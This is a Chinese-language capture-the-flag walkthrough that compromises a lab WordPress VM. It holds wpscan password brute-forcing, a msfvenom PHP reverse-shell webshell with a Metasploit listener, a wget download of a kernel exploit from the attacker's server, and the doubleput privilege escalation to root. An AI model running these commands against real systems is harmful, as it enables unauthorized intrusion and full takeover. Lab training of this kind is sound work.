1、主机探测

1、通过netdiscover检测主机IP地址

arp-scan 192.168.1.0/24

2、服务探测

1、通过nmap进行端口扫描

 nmap -A -sS -sV -v -p- 192.168.1.5

查看开放20、21、53、80、139、666、3306、12380端口

3、渗透测试

3.1 HTTP渗透

1.访问站点信息如下

访问80端口页面未发现有用信息

2.目录访问测试

dirb http://192.168.1.5

探测发现2个隐藏文件，未发现有用信息

3.目录探测

nikto -host http://192.168.1.5:12380

发现在robots文件中存在2个目录，查看站点开启SSL

4.访问站点目录

访问2个站点目录，均为同样的显示

5.https访问站点

通过https访问站点，发现打开一个新的页面，并查看该站点为WordPress搭建

6.使用wpscan进行测试

wpscan --url "https://192.168.1.5:12380/blogblog/" --enumerate at --enumerate ap --enumerate u --disable-tls-checks

其中发现有如下用户

7.爆破用户和密码

wpscan --url "https://192.168.1.5:12380/blogblog/" -U 'John' -P /usr/share/wordlists/rockyou.txt --disable-tls-checks

爆破到用户名和密码信息

8.登录平台上传webshell

生成木马文件

msfvenom -p php/meterpreter/reverse_tcp lhost-192.168.0.6 lport=4444 -f raw

点击插件--更新插件--点击安装

9.在MFS中开启监听

use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.1.6
set lport 4444
exploit

10.点击连接木马

在Media中选择library

打开shell.php，显示上传文件路径

获取到反弹shell

3.2 主机渗透

1.进入shell会话

shell
python -c 'import pty;pty.spawn("/bin/bash")'
lsb_release -a
uname -a

2.查找提权漏洞

searchsploit ubuntu 16.04 kernel 4.4

cat /usr/share/exploitdb/exploits/linux/local/39772.txt

3.下载EXP

wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
unzip 39772.zip

3.开启简单服务并下载

python -m http.server 8080

cd /tmp
wget http://192.168.1.6:8080/exploit.tar

4.编译执行文件

tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit

chmod 777 compile.sh
./compile.sh
./doubleput

已经获取到root权限

5.查看flag信息

cd /root
cat flag.txt
